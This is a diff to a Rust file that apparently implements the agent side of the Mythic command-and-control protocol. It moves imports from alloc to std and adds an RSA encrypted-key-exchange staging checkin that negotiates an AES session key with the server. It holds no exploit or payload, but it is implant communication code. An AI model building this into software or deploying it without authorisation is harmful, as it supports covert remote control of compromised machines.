@@ -9,23 +9,23 @@
 //! | RSA staging | [`ReqStagingRSA`] | types defined, RSA crypto not yet implemented |
 //! | Translation | [`ReqStagingTranslation`] | types defined, EKE logic left to implementor |
 
-use alloc::{
+use serde::{Deserialize, Serialize};
+use std::{
     string::{String, ToString},
     vec::Vec,
 };
-use serde::{Deserialize, Serialize};
 use uuid::Uuid;
 
-use crate::MythicResult;
-use crate::error::MythicError;
-use crate::transport::C2Transport;
+use super::codec::{
+    AES256_IV_LEN, Aes256HmacCrypto, decode_message, decode_message_plain, encode_message,
+    encode_message_plain,
+};
 use super::{
     ACTION_CHECKIN, ACTION_STAGING_RSA, ACTION_STAGING_TRANSLATION, ACTION_TRANSLATION_STAGING,
 };
-use super::codec::{
-    Aes256HmacCrypto, AES256_IV_LEN, encode_message, decode_message,
-    encode_message_plain, decode_message_plain,
-};
+use crate::MythicResult;
+use crate::error::MythicError;
+use crate::transport::C2Transport;
 // ── Standard checkin (plaintext / static key) ──────────────
 
 /// Standard checkin request — matches the official Mythic JSON schema.
@@ -323,13 +323,12 @@ pub fn direct_checkin<C: C2Transport>(
     } else {
         let packed = encode_message_plain(req, payload_uuid)?;
         let response = c2.checkin(&packed)?;
-        let (_, resp): (Uuid, RespCheckin) =
-            decode_message_plain(&response, Some(payload_uuid))?;
+        let (_, resp): (Uuid, RespCheckin) = decode_message_plain(&response, Some(payload_uuid))?;
         (resp, packed, response)
     };
 
     if resp.status != "success" {
-        return Err(MythicError::protocol(alloc::format!(
+        return Err(MythicError::protocol(format!(
             "checkin rejected: status={}",
             resp.status
         )));
@@ -342,13 +341,63 @@ pub fn direct_checkin<C: C2Transport>(
     })
 }
 
+/// Result of a successful RSA EKE staging exchange.
+#[cfg(feature = "rsa-staging")]
+pub struct RsaStagingResult {
+    /// Temporary UUID returned by Mythic; used as the outer UUID for the
+    /// follow-up checkin.
+    pub temp_uuid: Uuid,
+    /// The newly negotiated AES-256 session key.
+    pub crypto: Aes256HmacCrypto,
+    /// Base64 wire packet that was sent for the staging_rsa request.
+    pub packet_sent: String,
+    /// Base64 wire packet received from Mythic.
+    pub packet_received: String,
+}
+
+/// Perform RSA encrypted key exchange staging.
+///
+/// This generates a 4096-bit RSA keypair, sends it to Mythic encrypted with
+/// the transport's initial AES PSK, decrypts the returned session key, and
+/// returns the temporary UUID + new AES crypto for the follow-up checkin.
+#[cfg(feature = "rsa-staging")]
+pub fn rsa_staging_checkin<C: C2Transport>(
+    c2: &C,
+    payload_uuid: Uuid,
+) -> MythicResult<RsaStagingResult> {
+    use crate::protocol::crypto::{RsaEke, generate_session_id, random_iv};
+
+    let rsa = RsaEke::generate()?;
+    let pub_key_b64 = rsa.public_key_b64()?;
+    let session_id = generate_session_id();
+
+    let staging_req = ReqStagingRSA::new(pub_key_b64, session_id);
+
+    let initial_key_b64 = c2.get_aes_psk().ok_or(MythicError::KeyExchangeFailed)?;
+    let initial_crypto = Aes256HmacCrypto::from_base64_key(&initial_key_b64)?;
+    let iv = random_iv()?;
+
+    let packed = encode_message(&staging_req, payload_uuid, &initial_crypto, &iv)?;
+    let response = c2.checkin(&packed)?;
+    let (_, staging_resp): (Uuid, RespStagingRSA) =
+        decode_message(&response, Some(payload_uuid), &initial_crypto)?;
+
+    let crypto = rsa.session_crypto(&staging_resp.session_key)?;
+
+    Ok(RsaStagingResult {
+        temp_uuid: staging_resp.uuid,
+        crypto,
+        packet_sent: packed,
+        packet_received: response,
+    })
+}
+
 // ── Tests ───────────────────────────────────────────────────
 
 #[cfg(test)]
 mod tests {
     use super::*;
-    use alloc::vec;
-
+    use std::vec;
 
     // ── ReqCheckin tests ─────────────────────────
 
@@ -445,5 +494,4 @@ mod tests {
         assert!(json.contains("\"host\":\"web01\""));
         assert!(json.contains("\"pid\":1337"));
     }
-
 }
